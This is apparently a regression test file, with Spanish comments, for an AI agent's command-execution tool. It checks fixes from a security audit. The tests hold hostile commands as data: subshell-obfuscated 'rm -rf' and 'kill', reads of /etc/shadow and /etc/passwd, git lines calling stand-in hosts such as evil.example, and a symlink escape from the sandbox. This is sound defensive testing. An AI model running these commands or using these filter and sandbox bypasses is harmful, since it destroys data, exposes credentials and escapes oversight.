// src/tools/__tests__/run_command.test.ts
//
// Regresión de la auditoría de seguridad 2026-06-30 (AUDIT_SEGURIDAD_2026-06-30.md)
// sobre run_command.ts:
//   - CRIT-01: bypass de DESTRUCTIVE_PATTERNS mediante subshell $()/backticks.
//   - CRIT-02: ABSOLUTE_PROHIBITED_PATHS no se aplicaba al cuerpo del comando.
//   - CRIT-03: symlink dentro del workspace escapaba checkSandbox (path.resolve
//     no sigue symlinks pero exec()/chdir() sí).
//   - ALTA-01: `git`/`tsc` en READONLY_LEADERS eludían el check de cwd sin ser
//     read-only (git clone/config --global, tsc --outDir).
//   - MEDIA-01: sin cap máximo de timeout.
//   - MEDIA-04: isDangerousCommand (8 patrones) desincronizado con
//     checkDestructive (24 patrones) — el usuario nunca veía el intento.
//
// Cada escenario reproduce el ataque EXACTO descrito en la auditoría, no una
// versión idealizada.

import { describe, it, expect, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { runInContext } from '../../agents/exec_context.js';
import runCommandTool, {
  checkDestructive,
  checkProhibitedPaths,
  checkSandbox,
  clampTimeout,
  MAX_TIMEOUT_MS,
} from '../run_command.js';

function mkWorkspace(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'shinobi-runcmd-'));
}

/** Ejecuta `fn` con el workspace root fijado a `dir` (límite de checkSandbox). */
function withWs<T>(dir: string, fn: () => Promise<T>): Promise<T> {
  return runInContext({ cwd: dir, workspaceRoot: dir }, fn);
}

describe('CRIT-01 · checkDestructive detecta bypass vía subshell $()/backticks', () => {
  it('"rm$(echo -n) -rf /workspace" se bloquea (antes evadía \\brm\\s+-[a-z]*[rf])', () => {
    expect(checkDestructive('rm$(echo -n) -rf /workspace')).not.toBeNull();
  });

  it('"ki$(true)ll -9 1" se bloquea (bypass de kill vía subshell vacío)', () => {
    expect(checkDestructive('ki$(true)ll -9 1')).not.toBeNull();
  });

  it('subshell anidado "rm$(echo $(true))-rf /workspace" también se colapsa y bloquea', () => {
    expect(checkDestructive('rm$(echo $(true)) -rf /workspace')).not.toBeNull();
  });

  it('sigue bloqueando la ofuscación previa con backticks ("k`i`ll -9 1")', () => {
    expect(checkDestructive('k`i`ll -9 1')).not.toBeNull();
  });

  it('un comando benigno con $() legítimo no se bloquea', () => {
    expect(checkDestructive('echo $(date)')).toBeNull();
  });

  it('un comando benigno normal no se bloquea', () => {
    expect(checkDestructive('npm run format')).toBeNull();
  });
});

describe('CRIT-02 · checkProhibitedPaths bloquea rutas de sistema en el cuerpo del comando', () => {
  it('"cat /etc/shadow" se bloquea (antes pasaba libre)', () => {
    expect(checkProhibitedPaths('cat /etc/shadow')).not.toBeNull();
  });

  it('"curl file:///etc/passwd" se bloquea', () => {
    expect(checkProhibitedPaths('curl file:///etc/passwd')).not.toBeNull();
  });

  it('"cat /etc/sudoers" se bloquea', () => {
    expect(checkProhibitedPaths('cat /etc/sudoers')).not.toBeNull();
  });

  it('no bloquea de más un path que solo comparte prefijo de palabra ("/etc/passwd-old.bak")', () => {
    expect(checkProhibitedPaths('cat /etc/passwd-old.bak')).toBeNull();
  });

  it('un comando normal sin rutas prohibidas no se bloquea', () => {
    expect(checkProhibitedPaths('git status')).toBeNull();
  });
});

describe('CRIT-03 · checkSandbox sigue symlinks al validar cwd', () => {
  let workspace: string;
  let secretDir: string;
  afterEach(() => {
    if (workspace) fs.rmSync(workspace, { recursive: true, force: true });
    if (secretDir) fs.rmSync(secretDir, { recursive: true, force: true });
  });

  it('un symlink DENTRO del workspace que apunta fuera es rechazado como cwd', async () => {
    workspace = mkWorkspace();
    secretDir = mkWorkspace(); // simula /etc fuera del workspace
    fs.writeFileSync(path.join(secretDir, 'shadow'), 'root:x:hash', 'utf-8');

    const linkPath = path.join(workspace, 'l');
    try {
      // 'junction' no requiere privilegios elevados en Windows; en POSIX un
      // symlink normal sirve igual.
      fs.symlinkSync(secretDir, linkPath, process.platform === 'win32' ? 'junction' : 'dir');
    } catch (err) {
      console.warn('No se pudo crear symlink/junction en este entorno, test omitido:', err);
      return;
    }

    await withWs(workspace, async () => {
      // Léxicamente "workspace/l" cae dentro del workspace (path.resolve no
      // sigue symlinks). Solo fs.realpathSync revela que en realidad apunta
      // a secretDir, fuera del workspace — checkSandbox debe rechazarlo.
      const result = checkSandbox('cat shadow', linkPath);
      expect(result).not.toBeNull();
    });
  });

  it('el propio workspace root (sin symlink) sigue permitido como cwd', async () => {
    workspace = mkWorkspace();
    await withWs(workspace, async () => {
      const result = checkSandbox('echo hi', workspace);
      expect(result).toBeNull();
    });
  });
});

describe('ALTA-01 · git/tsc ya no eluden el check de cwd en bloque', () => {
  let workspace: string;
  let outsideDir: string;
  afterEach(() => {
    if (workspace) fs.rmSync(workspace, { recursive: true, force: true });
    if (outsideDir) fs.rmSync(outsideDir, { recursive: true, force: true });
  });

  it('"git clone ... /fuera" con cwd fuera del workspace se rechaza', async () => {
    workspace = mkWorkspace();
    outsideDir = mkWorkspace();
    await withWs(workspace, async () => {
      const result = checkSandbox('git clone https://evil.example/x.git', outsideDir);
      expect(result).not.toBeNull();
    });
  });

  it('"git config --global core.sshCommand ..." con cwd fuera del workspace se rechaza', async () => {
    workspace = mkWorkspace();
    outsideDir = mkWorkspace();
    await withWs(workspace, async () => {
      const result = checkSandbox('git config --global core.sshCommand "curl http://evil"', outsideDir);
      expect(result).not.toBeNull();
    });
  });

  it('"tsc --outDir /fuera" con cwd fuera del workspace se rechaza (ya no exento)', async () => {
    workspace = mkWorkspace();
    outsideDir = mkWorkspace();
    await withWs(workspace, async () => {
      const result = checkSandbox('tsc --outDir /fuera', outsideDir);
      expect(result).not.toBeNull();
    });
  });

  it('"git status" con cwd fuera del workspace SÍ se permite (subcomando read-only)', async () => {
    workspace = mkWorkspace();
    outsideDir = mkWorkspace();
    await withWs(workspace, async () => {
      const result = checkSandbox('git status', outsideDir);
      expect(result).toBeNull();
    });
  });

  it('"git log" con cwd fuera del workspace SÍ se permite', async () => {
    workspace = mkWorkspace();
    outsideDir = mkWorkspace();
    await withWs(workspace, async () => {
      const result = checkSandbox('git log --oneline', outsideDir);
      expect(result).toBeNull();
    });
  });
});

describe('MEDIA-01 · timeout tiene cap máximo', () => {
  it('un timeout absurdamente alto se clampea al máximo', () => {
    expect(clampTimeout(2147483647)).toBe(MAX_TIMEOUT_MS);
  });

  it('un timeout razonable no se toca', () => {
    expect(clampTimeout(5000)).toBe(5000);
  });

  it('sin timeout se usa el default de 30s', () => {
    expect(clampTimeout(undefined)).toBe(30_000);
  });

  it('el default también respeta el cap si algún día bajara el máximo por debajo de 30s', () => {
    // Documenta la invariante: clampTimeout nunca devuelve más que MAX_TIMEOUT_MS.
    expect(clampTimeout(MAX_TIMEOUT_MS + 1)).toBeLessThanOrEqual(MAX_TIMEOUT_MS);
  });
});

describe('MEDIA-04 · requiresConfirmation ve todo lo que bloquea checkDestructive', () => {
  it('pkill/taskkill/reboot exigen confirmación (antes fallaban en silencio)', () => {
    for (const cmd of ['pkill node', 'taskkill /F /IM node.exe', 'reboot']) {
      expect(checkDestructive(cmd)).not.toBeNull();
      expect(runCommandTool.requiresConfirmation!({ command: cmd })).toBe(true);
    }
  });

  it('un comando benigno no exige confirmación', () => {
    expect(runCommandTool.requiresConfirmation!({ command: 'git status' })).toBe(false);
  });
});

describe('P1.E4 · la ruta PowerShell de run_command entra por el Monitor de Referencia', () => {
  const itWin = process.platform === 'win32' ? it : it.skip;

  itWin('shell:"powershell" incrementa monitorStats().mediated (ya no esquiva mediatedEffect)', async () => {
    const { monitorStats, _resetMonitorStats } = await import('../../sandbox/monitor.js');
    _resetMonitorStats();
    const before = monitorStats().mediated;
    const result = await runCommandTool.execute({ command: "Write-Output 'shinobi-monitor-check'", shell: 'powershell' });
    expect(result.success).toBe(true);
    expect(result.output).toContain('shinobi-monitor-check');
    expect(monitorStats().mediated).toBe(before + 1);
  });

  itWin('shell:"auto" en win32 también entra por el monitor (comportamiento por defecto del producto)', async () => {
    const { monitorStats, _resetMonitorStats } = await import('../../sandbox/monitor.js');
    _resetMonitorStats();
    const before = monitorStats().mediated;
    await runCommandTool.execute({ command: "Write-Output 'shinobi-auto-check'" });
    expect(monitorStats().mediated).toBe(before + 1);
  });

  itWin('el backend "powershell" está registrado en el sandbox registry', async () => {
    const { sandboxRegistry } = await import('../../sandbox/registry.js');
    expect(sandboxRegistry().get('powershell' as any)).toBeDefined();
  });
});
